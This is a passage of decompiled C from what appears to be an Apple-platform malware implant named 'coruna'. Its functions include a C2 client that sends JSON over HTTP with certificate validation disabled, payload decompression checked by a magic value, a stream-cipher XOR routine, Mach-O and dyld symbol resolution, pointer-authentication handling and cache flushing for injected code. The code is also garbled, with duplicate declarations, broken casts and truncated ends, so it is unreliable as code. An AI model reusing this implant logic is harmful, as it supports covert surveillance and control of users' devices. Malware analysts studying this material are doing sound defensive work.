  uint64_t u;
  uint64_t scratch;
  
  scratch = 0;
  if (k_implant_rodata_word_2c070 == (void (*)0x0) {
    u = 0xffffffff;
  }
  else {
    (*k_implant_rodata_word_2c070)(&scratch,off_4,off_5);
    u = coruna_implant_via_copy_bytes_cc70_4(size_3,scratch);
  }
  return u;
}





uint64_t coruna_asl_log_hook(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  uint64_t u;
  uint64_t scratch;
  
  scratch = 0;
  if (k_implant_rodata_word_2c070 == (void (*)0x0) {
    u = 0xffffffff;
  }
  else {
    (*k_implant_rodata_word_2c070)(&scratch,off_4,&ghidra_stack_0);
    u = coruna_implant_via_copy_bytes_cc70_4(size_3,scratch);
  }
  return u;
}





uint64_t coruna_implant_via_copy_bytes_cc70_4(uint size,long handle)
{
  void (*ptr)(void);
  long handle;
  void (*buf)(void);
  void (*str)(void);
  long addr;
  uint64_t u;
  uint8_t scratch[6];
  uint16_t bootargs;
  
  addr = k_implant_rodata_word_2c798;
  str = k_implant_rodata_word_2c790;
  buf = k_implant_rodata_word_2c078;
  handle = k_implant_rodata_word_2c068;
  ptr = k_implant_rodata_word_2c060;
  if (((((k_implant_rodata_word_2c060 != (void (*)0x0 && k_implant_rodata_word_2c068 != 0) && k_implant_rodata_word_2c078 != (void (*)0x0) &&
       k_implant_rodata_word_2c790 != (void (*)0x0) && k_implant_rodata_word_2c798 != 0) && size < 7 ||
      ((((k_implant_rodata_word_2c060 != (void (*)0x0 && k_implant_rodata_word_2c068 != 0) && k_implant_rodata_word_2c078 != (void (*)0x0) &&
       k_implant_rodata_word_2c790 != (void (*)0x0) && k_implant_rodata_word_2c798 != 0) && size == 7) {
    coruna_copy_bytes_cc70(scratch,8);
    scratch[0] = 0;
    bootargs = 0x201;
    if (handle != 0) {
      u = (*buf)();
      (*ptr)(u,handle,scratch[size],addr);
      (*str)(handle);
      return 0;
    }
  }
  return 0xffffffff;
}





long coruna_implant_residual_44(long *handle)
{
  int err;
  int *err;
  
  err = *(int *)(*handle + 0x10);
  if (err != 0) {
    err = (int *)(handle[0xd] + 0x20);
    do {
      if ((*err == 0x19) && ((*(byte *)(err + 0xf) >> 1 & 1) != 0)) {
        return *(long *)(err + 6) + (handle[0xb] - handle[10]);
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  return 0;
}





uint64_t
uint64_t coruna_return_zero_ead4(int64_t arg,uint *size,uint64_t *val,uint64_t id_2,uint64_t size_3)
{
  unsigned long u;
  ushort size;
  int err;
  unsigned long scratch;
  
  scratch = 0;
  if (((~(byte)size[1] & 0xe) == 0) &&
     (size = *(ushort *)((long)size + 6), ((byte)size[1] & 0x10) != 0 || (size & 0x80) != 0)
     ) {
    scratch = *(long *)(size + 2) + *(long *)(arg + 0x60);
    *val = scratch;
    if ((size >> 3 & 1) == 0) {
      return 1;
    }
    scratch = scratch | 1;
  }
  else {
    if ((*(long *)(arg + 0x48) == 0) ||
       (u = *(long *)(arg + 0x48) + (unsigned long)*size,
       u < *(unsigned long *)(arg + 0x58) ||
       *(unsigned long *)(arg + 0x58) + (unsigned long)*(uint *)(arg + 0xa8) <= u)) {
      return 0;
    }
    err = coruna_resolve_libcache_sym(u,id_2,size_3,&scratch,0);
    if (err != 0) {
      return 0;
    }
    *val = scratch;
    err = coruna_resolve_asl_oslog(u,size_3,&scratch);
    if (err != 0) {
      return 1;
    }
  }
  *val = scratch;
  return 1;
}





void coruna_objc_nsobject_pair(uint64_t val,uint64_t id_2,long handle)
{
  uint32_t u;
  int err;
  uint64_t size;
  long handle;
  long addr;
  uint64_t version;
  uint8_t *ptr;
  long off;
  
  handle = *(long *)(handle + 0x30);
  ptr = *(uint8_t **)(handle + 0x20);
  if (ptr != &k_implant_ctx_slot_tertiary) {
    if (ptr == &k_implant_ctx_slot_secondary) {
      if (*(long *)(handle + 0x28) == 0) {
        return;
      }
      coruna_dyld_cached_port_ptr(handle,*(long *)(handle + 0x28),0x330);
      *(long *)(handle + 0x110) = *(long *)(handle + 0x110) + 4;
      return;
    }
    if (ptr != &k_implant_ctx_slot_primary) {
      return;
    }
  }
  addr = *(long *)(handle + 0x28);
  if (addr != 0) {
    coruna_dyld_cached_port_ptr(addr,handle,0x330);
    version = *(uint64_t *)(addr + 0x330);
    *(uint8_t **)(handle + 0x20) = &k_implant_ctx_slot_secondary;
    *(long *)(handle + 0x108) = addr + 0x3fe0;
    u = *(uint32_t *)(handle + 0x10);
    *(uint32_t *)(addr + 0x3ffc) = u;
    *(uint32_t *)(&k_implant_ctx_field_u32 + addr) = u;
    if (ptr == &k_implant_ctx_slot_tertiary) {
      off = *(long *)(addr + 0x338);
      err = coruna_return_zero();
      if (err == 0) {
        size = 0x1000;
      }
      else {
        size = coruna_pacib(0x1000,&UNK_00004030 + addr);
      }
      *(uint64_t *)(&k_implant_ctx_field_u64 + addr) = size;
      off = *(long *)(handle + 0x18) + off;
    }
    else {
      off = *(long *)(handle + 0x18);
    }
    *(long *)(handle + 0xa8) = off;
    *(uint64_t *)(handle + 0x110) = version;
  }
  return;
}





uint64_t
uint64_t coruna_macho_find_section(uint64_t val,uint64_t id_2,int64_t arg,int64_t *arg,uint64_t *size_3)
{
  uint64_t u;
  int err;
  uint64_t size;
  unsigned long version;
  int *err;
  int *status;
  int *flags;
  int *count;
  int *idx;
  uint port;
  
  size = 0x18006;
  if (*(int *)(arg + 0x10) != 0) {
    status = (int *)0x0;
    port = 0;
    err = (int *)(arg + 0x20);
    count = (int *)0x0;
    do {
      idx = count;
      if ((count != (int *)0x0) && (status != (int *)0x0)) break;
      if (*err == 0x19) {
        err = coruna_implant_residual_41(err + 2,"__TEXT");
        idx = err;
        if (err != 0) {
          idx = count;
        }
        if (status == (int *)0x0) {
          err = coruna_implant_residual_41(err + 2,val);
          if ((err == 0) && (err[0x10] != 0)) {
            version = 0;
            count = err + 0x12;
            flags = (int *)0x0;
            do {
              err = coruna_implant_residual_41(count,id_2);
              status = count;
              if (err != 0) {
                status = flags;
              }
              version = version + 1;
              count = count + 0x14;
              flags = status;
            } while (version < (uint)err[0x10]);
          }
          else {
            status = (int *)0x0;
          }
        }
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      port = port + 1;
      count = idx;
    } while (port < *(uint *)(arg + 0x10));
    size = 0x18006;
    if ((idx != (int *)0x0) && (status != (int *)0x0)) {
      size = 0;
      u = *(uint64_t *)(status + 10);
      *arg = (arg - *(long *)(idx + 6)) + *(long *)(status + 8);
      *size_3 = u;
    }
  }
  return size;
}





uint64_t
uint64_t coruna_bind_resolver(int64_t arg,uint64_t val,uint size,uint64_t id_2,int64_t arg,uint64_t *size_3)
{
  unsigned long u;
  long handle;
  unsigned long size;
  int err;
  long extraout_x1;
  unsigned long *ptr;
  unsigned long version;
  size_t ls7;
  unsigned long port;
  unsigned long scratch;
  unsigned long scratch;
  unsigned long *bootargs;
  uint8_t *thread_attr;
  uint8_t host_info[16];
  long serial_buf;
  unsigned long action;
  
  (*(void (*)k_implant_chkstk_darwin_slot)(arg,(unsigned long)(size + 1) << 3);
  handle = -(extraout_x1 + 0xfU & 0xffffffff0);
  ptr = (unsigned long *)((long)&scratch + handle);
  coruna_copy_bytes_cc70(ptr);
  version = (id_2 + arg) - 1;
  if (id_2 <= version) {
    port = 0;
    scratch = (unsigned long)size;
    ls7 = scratch << 3;
    bootargs = size_3;
    thread_attr = (uint8_t *)&scratch;
    do {
      err = (**(void (**)(arg + 0x10))(version,host_info);
      size = action;
      if ((err != 0) && (action != port)) {
        _memmove((void *)((long)&scratch + handle),ptr,ls7);
        *ptr = size;
        if ((serial_buf != 0) && (err = coruna_implant_residual_41(serial_buf,val), err == 0)) {
          *bootargs = ptr[scratch];
          return 0;
        }
        port = size;
        if (size != 0) {
          u = version;
          if (size < id_2 + arg && id_2 <= size) {
            u = size;
          }
          if (size < version) {
            version = u;
          }
        }
      }
      version = version - 1;
    } while (id_2 <= version);
  }
  return 0x18005;
}





uint64_t coruna_webbookmarks_delete(char *path)
{
  uint64_t u;
  long handle;
  long addr;
  unsigned long size;
  long off;
  uint64_t version;
  uint64_t port;
  uint8_t size[16];
  uint8_t version[16];
  
  port = 0xad00b;
  if (path == (char *)0x0) {
    return 0xad001;
  }
  if (*path == '\0') {
    return 0xad001;
  }
  u = _objc_autoreleasePoolPush();
  size = _dlopen("/System/Library/PrivateFrameworks/WebBookmarks.framework/WebBookmarks",2);
  _objc_autoreleasePoolPop(u);
  return port;
}





uint64_t coruna_lzfse_decode(uint64_t *dst,uint *src)
{
  uint u;
  uint size;
  void *ptr;
  unsigned long version;
  uint64_t port;
  int *err;
  unsigned long tag;
  
  port = 0xad001;
  if (((dst != (uint64_t *)0x0) &&
      (err = (int *)*dst, err != (int *)0x0 && src != (uint *)0x0)) &&
     (u = *src, u != 0)) {
    if ((7 < u) && (*err == 0xbedf00d)) {
      size = err[1];
      tag = (unsigned long)size;
      if ((size != 0) && (u - 8 < size)) {
        ptr = _malloc(tag + 1);
        if (ptr == (void *)0x0) {
          return 0xad009;
        }
        _memset_s(ptr,tag,0,tag);
        version = _compression_decode_buffer(ptr,tag + 1,err + 2,u - 8,0,0x306);
        if (version == tag) {
          _memset_s(err,u,0,u);
          _free(err);
          *dst = ptr;
          *src = size;
          return 0;
        }
        _memset_s(ptr,tag,0,tag);
        _free(ptr);
        return 0xad00b;
      }
    }
    port = 0;
  }
  return port;
}
void coruna_implant_via_u64_pack(uint *size,long handle,long addr_2)
{
  uint u;
  uint size;
  uint version;
  uint port;
  uint64_t tag;
  uint kind;
  uint type_id;
  uint type_id_8;
  uint type_id_9;
  uint type_id_10;
  uint type_id_11;
  uint type_id_12;
  long handle;
  byte err;
  int err;
  unsigned long type_id_13;
  uint type_id_14;
  uint type_id_15;
  uint type_id_16;
  uint type_id_17;
  uint type_id_18;
  long addr;
  uint32_t scratch;
  uint scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint block_ctx;
  uint serial_buf;
  uint action;
  uint block_ctx;
  uint stack_guard;
  uint sa_saved;
  uint sa_new;
  uint path_buf;
  uint64_t stack_guard;
  uint64_t tmp_buf;
  
  tag = k_implant_rodata_word_00026a48;
  if (((handle != 0) && (addr_2 != 0)) && (size != (uint *)0x0)) {
    handle = 0;
    host_info = 0;
    thread_attr = 0;
    serial_buf = 0;
    host_info = 0;
    bootargs = 0;
    thread_attr = 0;
    bootargs = 0;
    block_ctx = *size;
    sa_saved = (uint)*(uint64_t *)(size + 5);
    sa_new = (uint)((unsigned long)*(uint64_t *)(size + 5) >> 0x20);
    action = k_implant_md5_init_state;
    block_ctx = (uint)*(uint64_t *)(size + 3);
    stack_guard = (uint)((unsigned long)*(uint64_t *)(size + 3) >> 0x20);
    serial_buf = (uint)*(uint64_t *)(size + 1);
    action = (uint)((unsigned long)*(uint64_t *)(size + 1) >> 0x20);
    path_buf = size[7];
    stack_guard = 0;
    tmp_buf = 0;
    type_id_13 = 0x40;
    do {
      if (type_id_13 < 0x40) {
        err = *(byte *)((long)&scratch + type_id_13);
      }
      else {
        scratch = (uint)action;
        scratch = (uint)((unsigned long)action >> 0x20);
        host_info = (uint)stack_guard;
        kind = (uint)host_info;
        host_info = (uint)((unsigned long)stack_guard >> 0x20);
        type_id = host_info;
        bootargs = (uint)tag;
        bootargs = (uint)((unsigned long)tag >> 0x20);
        serial_buf = 0;
        serial_buf = 0;
        err = 10;
        type_id_16 = block_ctx;
        type_id_14 = serial_buf;
        type_id_17 = stack_guard;
        type_id_18 = sa_saved;
        type_id_9 = action;
        type_id_12 = block_ctx;
        type_id_10 = (uint)bootargs;
        type_id_11 = bootargs;
        type_id_15 = sa_new;
        type_id_8 = path_buf;
        do {
          host_info = (uint)host_info ^ scratch + type_id_16;
          type_id_17 = ((uint)host_info >> 0x10 | (uint)host_info << 0x10) + type_id_17;
          u = type_id_17 ^ type_id_16;
          scratch = (u >> 0x14 | u << 0xc) + scratch + type_id_16;
          type_id_16 = scratch ^ ((uint)host_info >> 0x10 | (uint)host_info << 0x10);
          type_id_17 = (type_id_16 >> 0x18 | type_id_16 << 8) + type_id_17;
          u = type_id_17 ^ (u >> 0x14 | u << 0xc);
          host_info = host_info ^ scratch + type_id_14;
          type_id_18 = (host_info >> 0x10 | host_info << 0x10) + type_id_18;
          size = type_id_18 ^ type_id_14;
          scratch = (size >> 0x14 | size << 0xc) + scratch + type_id_14;
          version = scratch ^ (host_info >> 0x10 | host_info << 0x10);
          type_id_18 = (version >> 0x18 | version << 8) + type_id_18;
          type_id_14 = type_id_18 ^ (size >> 0x14 | size << 0xc);
          serial_buf = (uint)serial_buf ^ type_id_10 + type_id_9;
          type_id_15 = ((uint)serial_buf >> 0x10 | (uint)serial_buf << 0x10) + type_id_15;
          size = type_id_15 ^ type_id_9;
          type_id_10 = (size >> 0x14 | size << 0xc) + type_id_10 + type_id_9;
          port = type_id_10 ^ ((uint)serial_buf >> 0x10 | (uint)serial_buf << 0x10);
          type_id_15 = (port >> 0x18 | port << 8) + type_id_15;
          type_id_9 = type_id_15 ^ (size >> 0x14 | size << 0xc);
          serial_buf = serial_buf ^ type_id_11 + type_id_12;
          type_id_8 = (serial_buf >> 0x10 | serial_buf << 0x10) + type_id_8;
          size = type_id_8 ^ type_id_12;
          type_id_11 = (size >> 0x14 | size << 0xc) + type_id_11 + type_id_12;
          type_id_12 = type_id_11 ^ (serial_buf >> 0x10 | serial_buf << 0x10);
          type_id_8 = (type_id_12 >> 0x18 | type_id_12 << 8) + type_id_8;
          size = type_id_8 ^ (size >> 0x14 | size << 0xc);
          scratch = (type_id_14 >> 0x19 | type_id_14 << 7) + scratch;
          type_id_12 = scratch ^ (type_id_12 >> 0x18 | type_id_12 << 8);
          type_id_15 = (type_id_12 >> 0x10 | type_id_12 << 0x10) + type_id_15;
          type_id_14 = type_id_15 ^ (type_id_14 >> 0x19 | type_id_14 << 7);
          scratch = (type_id_14 >> 0x14 | type_id_14 << 0xc) + scratch;
          type_id_12 = scratch ^ (type_id_12 >> 0x10 | type_id_12 << 0x10);
          serial_buf = type_id_12 >> 0x18 | type_id_12 << 8;
          type_id_15 = serial_buf + type_id_15;
          type_id_14 = type_id_15 ^ (type_id_14 >> 0x14 | type_id_14 << 0xc);
          type_id_14 = type_id_14 >> 0x19 | type_id_14 << 7;
          scratch = (type_id_9 >> 0x19 | type_id_9 << 7) + scratch;
          type_id_12 = scratch ^ (type_id_16 >> 0x18 | type_id_16 << 8);
          type_id_8 = (type_id_12 >> 0x10 | type_id_12 << 0x10) + type_id_8;
          type_id_9 = type_id_8 ^ (type_id_9 >> 0x19 | type_id_9 << 7);
          scratch = (type_id_9 >> 0x14 | type_id_9 << 0xc) + scratch;
          type_id_12 = scratch ^ (type_id_12 >> 0x10 | type_id_12 << 0x10);
          host_info = type_id_12 >> 0x18 | type_id_12 << 8;
          type_id_8 = (uint)host_info + type_id_8;
          type_id_9 = type_id_8 ^ (type_id_9 >> 0x14 | type_id_9 << 0xc);
          type_id_9 = type_id_9 >> 0x19 | type_id_9 << 7;
          type_id_10 = (size >> 0x19 | size << 7) + type_id_10;
          type_id_12 = type_id_10 ^ (version >> 0x18 | version << 8);
          type_id_17 = (type_id_12 >> 0x10 | type_id_12 << 0x10) + type_id_17;
          type_id_16 = type_id_17 ^ (size >> 0x19 | size << 7);
          type_id_10 = (type_id_16 >> 0x14 | type_id_16 << 0xc) + type_id_10;
          type_id_12 = type_id_10 ^ (type_id_12 >> 0x10 | type_id_12 << 0x10);
          host_info = type_id_12 >> 0x18 | type_id_12 << 8;
          type_id_17 = host_info + type_id_17;
          type_id_12 = type_id_17 ^ (type_id_16 >> 0x14 | type_id_16 << 0xc);
          type_id_12 = type_id_12 >> 0x19 | type_id_12 << 7;
          type_id_11 = type_id_11 + (u >> 0x19 | u << 7);
          type_id_16 = type_id_11 ^ (port >> 0x18 | port << 8);
          type_id_18 = (type_id_16 >> 0x10 | type_id_16 << 0x10) + type_id_18;
          u = type_id_18 ^ (u >> 0x19 | u << 7);
          type_id_11 = (u >> 0x14 | u << 0xc) + type_id_11;
          type_id_16 = type_id_11 ^ (type_id_16 >> 0x10 | type_id_16 << 0x10);
          serial_buf = type_id_16 >> 0x18 | type_id_16 << 8;
          type_id_18 = (uint)serial_buf + type_id_18;
          type_id_16 = type_id_18 ^ (u >> 0x14 | u << 0xc);
          type_id_16 = type_id_16 >> 0x19 | type_id_16 << 7;
          err = err + -1;
        } while (err != 0);
        addr = 0;
        thread_attr = coruna_u64_pack((type_id_12), (type_id_9));
        thread_attr = coruna_u64_pack((type_id_18), (type_id_17));
        host_info = coruna_u64_pack((type_id_8), (type_id_15));
        err = (char)action + (char)scratch;
        bootargs = coruna_u64_pack((bootargs + type_id_11), ((uint))bootargs + type_id_10);
        bootargs = coruna_u64_pack((type_id_14), (type_id_16));
        do {
          *(unsigned long *)((long)&thread_attr + addr) =
               coruna_u64_pack(((int)((unsigned long)*(uint64_t *)((long)&action + addr) >> 0x20) +
                        (int)((unsigned long)*(uint64_t *)((long)&thread_attr + addr) >> 0x20)), (int)*(uint64_t *)((long)&action + addr) +
                        (int)*(uint64_t *)((long)&thread_attr + addr));
          *(unsigned long *)((long)&bootargs + addr) =
               coruna_u64_pack(((int)((unsigned long)*(uint64_t *)((long)&block_ctx + addr) >> 0x20) +
                        (int)((unsigned long)*(uint64_t *)((long)&bootargs + addr) >> 0x20)), (int)*(uint64_t *)((long)&block_ctx + addr) +
                        (int)*(uint64_t *)((long)&bootargs + addr));
          addr = addr + 0x10;
        } while (addr != 0x30);
        stack_guard = coruna_u64_pack((type_id), (kind + 1));
        type_id_13 = 0;
        if (kind == 0xffffffff) {
          stack_guard = (unsigned long)(type_id + 1) << 0x20;
        }
      }
      *(byte *)(handle + handle) = *(byte *)(handle + handle) ^ err;
      type_id_13 = type_id_13 + 1;
      handle = handle + 1;
    } while (handle != addr_2);
  }
  return;
}





int coruna_cfhttp_get_post(char *path,long handle,long addr_2,char *str_2,uint64_t *val,
                uint *size)
{
  char *ptr;
  bool err;
  bool status;
  int err;
  uint u;
  long handle;
  long addr;
  long off;
  size_t ls9;
  long base;
  long ctx_val;
  long serial;
  long serial_7;
  long serial_8;
  long serial_9;
  long *ptr;
  uint64_t size;
  void *buf;
  void *str;
  long *copy;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  uint64_t type_id;
  uint64_t type_id_8;
  uint64_t type_id_9;
  void (*buf)(void);
  uint64_t type_id_10;
  long scratch;
  long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint64_t block_ctx;
  long *stack_guard;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t sa_saved;
  uint64_t sa_new[2];
  
  action = 0;
  err = val == (uint64_t *)0x0;
  status = size == (uint *)0x0;
  if (path == (char *)0x0) {
    return 0xad001;
  }
  if (*path == '\0') {
    return 0xad001;
  }
  if ((err || status) && (val != (uint64_t *)0x0 || size != (uint *)0x0)) {
    return 0xad001;
  }
  type_id_10 = *(uint64_t *)k_implant_kcfallocatordefault_slot;
  handle = _CFStringCreateWithCString(type_id_10,path,0x8000100);
  if (handle == 0) {
    err = 0x3002;
    if (action != 0) {
    _CFRelease();
    }
    return err;
  }
  addr = _CFStringGetLength();
  off = handle;
  if (addr < 1) {
    err = 0x3003;
  }
  else {
    addr = 0;
    if (handle == 0) {
done:
      if (addr_2 == 0) {
        scratch = 0;
cleanup:
        if (str_2 == (char *)0x0) {
          off = 0;
check_ok:
          u = 0;
          copy = &action;
          if (err || status) {
            copy = (long *)0x0;
          }
          ptr = "GET";
          if (off != 0) {
            ptr = "POST";
          }
          version = *(uint64_t *)k_implant_kcfhttpversion1_1_slot;
          type_id = *(uint64_t *)k_implant_kcfstreamsslvalidatescertificatechain_slot;
          port = *(uint64_t *)k_implant_kcfbooleanfalse_slot;
          type_id_8 = *(uint64_t *)k_implant_kcfstreampropertysslsettings_slot;
          tag = *(uint64_t *)k_implant_kcfstreampropertyhttpproxy_slot;
          type_id_9 = *(uint64_t *)k_implant_kcfrunloopcommonmodes_slot;
          kind = *(uint64_t *)k_implant_kcfrunloopdefaultmode_slot;
          do {
            if (!err && !status) {
              *copy = 0;
            }
            base = _CFURLCreateWithString(type_id_10,handle,0);
            if (base == 0) {
              if (6 < u) {
                err = 0x3002;
                _CFRelease(handle);
                if (addr != 0) {
                load_ok:
                _CFRelease(addr);
                }
                if (scratch != 0) {
                _CFRelease(scratch);
                }
                if (action != 0) {
                _CFRelease();
                }
                return err;
              }
            }
            else {
              ctx_val = _CFURLCopyScheme();
              if (ctx_val == 0) {
                err = 0x300d;
                serial = base;
next:
                _CFRelease(serial);
              }
              else {
                serial = _CFStringCreateWithCString(type_id_10,ptr,0x8000100);
                err = 0xad009;
                if (serial == 0) {
                  _CFRelease(base);
                  _CFRelease(ctx_val);
                }
                else {
                  serial_7 = _CFHTTPMessageCreateRequest(type_id_10,serial,base,version);
                  if (serial_7 == 0) {
                    err = 0x3009;
                    _CFRelease(base);
                    _CFRelease(ctx_val);
                  }
                  if (off != 0) {
                    _CFHTTPMessageSetBody(serial_7);
                  }
                  if (addr == 0) {
                    serial_buf = 0;
found:
                    if (scratch == 0) {
                      host_info = 0;
                    }
                    else {
                      host_info = _CFStringCreateWithCString(type_id_10,"Content-Type",0x8000100);
                      if (host_info == 0) goto nomem;
                      _CFHTTPMessageSetHeaderFieldValue(serial_7,host_info,scratch);
                    }
                    serial_8 = _CFReadStreamCreateForHTTPRequest(type_id_10,serial_7);
                    if (serial_8 == 0) {
                      bootargs = 0;
                      thread_attr = 0;
                      err = 0x300a;
                    }
                    else {
                      thread_attr = _CFStringCreateWithCString(type_id_10,"https",0x8000100);
                      if (thread_attr == 0) {
                        bootargs = 0;
                        err = 0xad009;
                      }
                      else {
                        err = _CFEqual(thread_attr,ctx_val);
                        if (err == 0) {
invalid:
                          serial_9 = _SCDynamicStoreCopyProxies(0);
                          if (serial_9 == 0) {
                            bootargs = 0;
                            err = 0x300e;
                          }
                          else {
                            err = _CFReadStreamSetProperty(serial_8,tag,serial_9);
                            _CFRelease(serial_9);
                            continue;
                          }
                        }
                        else {
                          block_ctx = type_id;
                          sa_new[0] = port;
                          serial_9 = _CFDictionaryCreate(type_id_10,&block_ctx,sa_new,1,0,0);
                          if (serial_9 == 0) {
                            bootargs = 0;
                            err = 0x300f;
                          }
                          else {
                            err = _CFReadStreamSetProperty(serial_8,type_id_8,serial_9);
                            _CFRelease(serial_9);
                            if (err != 0) {
                              serial_9 = _SCDynamicStoreCopyProxies(0);
                              if (serial_9 == 0) {
                                bootargs = 0;
                                err = 0x300e;
                              }
                              else {
                                err = _CFReadStreamSetProperty(serial_8,tag,serial_9);
                                _CFRelease(serial_9);
                                continue;
                              }
                            }
again:
                            bootargs = 0;
                            err = 0x300c;
                          }
                        }
                      }
                      _CFRelease(serial_8);
                    }
                  }
                  else {
                    serial_buf = _CFStringCreateWithCString(type_id_10,"User-Agent",0x8000100);
                    if (serial_buf != 0) {
                      _CFHTTPMessageSetHeaderFieldValue(serial_7,serial_buf,addr);
                      goto found;
                    }
                    serial_buf = 0;
nomem:
                    bootargs = 0;
                    thread_attr = 0;
                    host_info = 0;
                    err = 0xad009;
                  }
                  _CFRelease(serial_7);
                  _CFRelease(base);
                  _CFRelease(ctx_val);
                  _CFRelease(serial);
                  if (serial_buf != 0) {
                    _CFRelease();
                  }
                  if (host_info != 0) {
                    _CFRelease();
                  }
                  if (thread_attr != 0) {
                    _CFRelease();
                  }
                  if ((bootargs != 0) && (serial = bootargs, err != 0)) {
                    _CFRelease(serial);
                  }
                }
              }
              base = action;
              if ((6 < u) || (err == 0)) goto parse_ok;
            }
            u = u + 1;
          } while( true );
        }
        ls9 = _strlen(str_2);
        off = _CFDataCreate(type_id_10,str_2,ls9);
        if (off != 0) goto check_ok;
        err = 0x3018;
      }
      else {
        scratch = _CFStringCreateWithCString(type_id_10,addr_2,0x8000100);
        if (scratch == 0) {
          scratch = 0;
          off = 0;
          err = 0x3016;
          _CFRelease(handle);
          if (addr != 0) {
          load_ok:
          _CFRelease(addr);
          }
          if (scratch != 0) {
          _CFRelease(scratch);
          }
          if (action != 0) {
          _CFRelease();
          }
          return err;
        }
        off = _CFStringGetLength();
        if (0 < off) goto cleanup;
        err = 0x3017;
      }
      off = 0;
      _CFRelease(handle);
      if (addr != 0) {
      load_ok:
      _CFRelease(addr);
      }
      if (scratch != 0) {
      _CFRelease(scratch);
      }
      if (action != 0) {
      _CFRelease();
      }
      return err;
    }
    addr = _CFStringCreateWithCString(type_id_10,handle,0x8000100);
    if (addr != 0) {
      off = _CFStringGetLength();
      if (0 < off) goto done;
      _CFRelease(handle);
      off = 0;
      scratch = 0;
      err = 0x3017;
      if (addr != 0) {
        _CFRelease(addr);
      }
      if (scratch != 0) {
        _CFRelease(scratch);
      }
      if (action != 0) {
        _CFRelease();
      }
      return err;
    }
    err = 0x3016;
  }
load_ok_15:
  _CFRelease(off);
fail:
  if (action != 0) {
    _CFRelease();
  }
  return err;
}





uint64_t
uint64_t coruna_c2_http_json(char *path,uint64_t val,uint64_t id_2,uint64_t size_3, uint64_t off_4)
{
  int err;
  uint64_t u;
  uint scratch;
  void *bootargs;
  
  bootargs = (void *)0x0;
  scratch = 0;
  if ((path == (char *)0x0) || (*path == '\0')) {
    u = 0;
  }
  else {
    err = _strncmp(path,"http://",7);
    if ((err == 0) || (err = _strncmp(path,"https://",8), err == 0)) {
      u = coruna_c2_json_body(id_2,size_3,off_4,&bootargs,&scratch);
      if ((int)u == 0) {
        u = coruna_cfhttp_get_post(path,val,"application/json",bootargs,0,0);
        _bzero(bootargs,(unsigned long)scratch);
        _free(bootargs);
      }
    }
    else {
      u = 0xad014;
    }
  }
  return u;
}





uint64_t
uint64_t coruna_c2_json_body(uint64_t val,int64_t arg,uint64_t id_2,uint64_t size_3, uint64_t off_4)
{
  uint64_t u;
  char *ptr;
  uint scratch;
  void *bootargs;
  
  bootargs = (void *)0x0;
  scratch = 0;
  if (arg == 0) {
    ptr = "{\\\"e\\\":%u,\\\"l\\\":%u}";
  }
  else {
    ptr = "{\\\"e\\\":%u,\\\"f\\\":\\\"%s\\\",\\\"l\\\":%u}";
  }
  u = coruna_vsnprintf_alloc(&bootargs,&scratch,ptr);
  if ((int)u == 0) {
    u = coruna_vsnprintf_alloc(size_3,off_4,"{\"cmd\":\"logmsg\",\"args\":{\"msg\":\"%s\"}}");
    _bzero(bootargs,(unsigned long)scratch);
    _free(bootargs);
  }
  return u;
}





void coruna_cfhttp_stream_client(uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  int err;
  uint32_t u;
  long handle;
  unsigned long size;
  uint8_t port[16];
  uint8_t scratch[4096];
  
  port = (*(void (*)k_implant_chkstk_darwin_slot)();
  size = port;
  handle = port;
  if ((handle != 0) && (size_3 != (uint64_t *)0x0)) {
    if (size < 9) {
      switch(size) {
      default:
        return;
      }
    }
    else if ((size == 0x10) &&
            (handle = _CFReadStreamCopyProperty
                               (handle,*(uint64_t *)
                                       k_implant_kcfstreampropertyhttpresponseheader_slot),
            handle != 0)) {
      u = _CFHTTPMessageGetResponseStatusCode();
      *(uint32_t *)((long)size_3 + 0xc) = u;
      _CFRelease(handle);
    }
  }
  _CFRunLoopGetCurrent();
  _CFRunLoopStop();
fail:
  return;
}





uint64_t coruna_vsnprintf_alloc(uint64_t *val,int *flags,char *path)
{
  uint u;
  int err;
  char *ptr;
  uint64_t size;
  unsigned long version;
  
  size = 0xad001;
  if (((val != (uint64_t *)0x0) && (flags != (int *)0x0)) && (path != (char *)0x0)) {
    u = _vsnprintf((char *)0x0,0,path,&ghidra_stack_0);
    if ((int)u < 1) {
      ptr = (char *)0x0;
      err = 0;
      size = 0xad014;
    }
    else {
      version = (unsigned long)(u + 1);
      ptr = _malloc(version);
      if (ptr == (char *)0x0) {
        size = 0xad009;
        err = 0;
      }
      else {
        err = _vsnprintf(ptr,version,path,&ghidra_stack_0);
        if ((int)u < err) {
          _bzero(ptr,version);
          _free(ptr);
          ptr = (char *)0x0;
          err = 0;
          size = 0xad00b;
        }
        else {
          size = 0;
          ptr[u] = '\0';
        }
      }
    }
    *val = ptr;
    *flags = err;
  }
  return size;
}





void coruna_flush_caches(long ctx,long addr,uint size)
{
  uint u;
  uint size;
  unsigned long version;
  uint port;
  
  if ((addr == 0) || (size == 0)) {
    size = *(uint *)(ctx + 0x90);
    if (size == 0) {
      return;
    }
    addr = *(long *)(ctx + 0x88);
  }
  version = 0;
  port = size;
  do {
    size = port - 0x50000;
    if (0x4ffff < port) {
      port = 0x50000;
    }
    _sys_dcache_flush((void *)(addr + version),(unsigned long)port);
    _sys_icache_invalidate((void *)(addr + version),(unsigned long)port);
    u = (int)version + 0x50000;
    version = (unsigned long)u;
    port = size;
  } while (u < size);
  return;
}





uint64_t coruna_bzero_2(long handle,uint size)
{
  uint u;
  long handle;
  uint *ptr;
  uint size;
  void *ptr;
  
  handle = *(long *)(handle + 0x88) + (unsigned long)*(uint *)(handle + 0x90);
  ptr = (uint *)(handle + -4);
  if (*(uint **)(handle + 0x138) != (uint *)0x0) {
    ptr = *(uint **)(handle + 0x138);
  }
  do {
    size = *ptr;
    u = size + size + (uint)(size == 0) * 4;
    if (*(uint *)(handle + 0x90) < u) {
      return 0xc003;
    }
  } while (*ptr != size);
  *ptr = u;
  ptr = (void *)(handle - (unsigned long)u);
  *(void **)(handle + 0x48) = ptr;
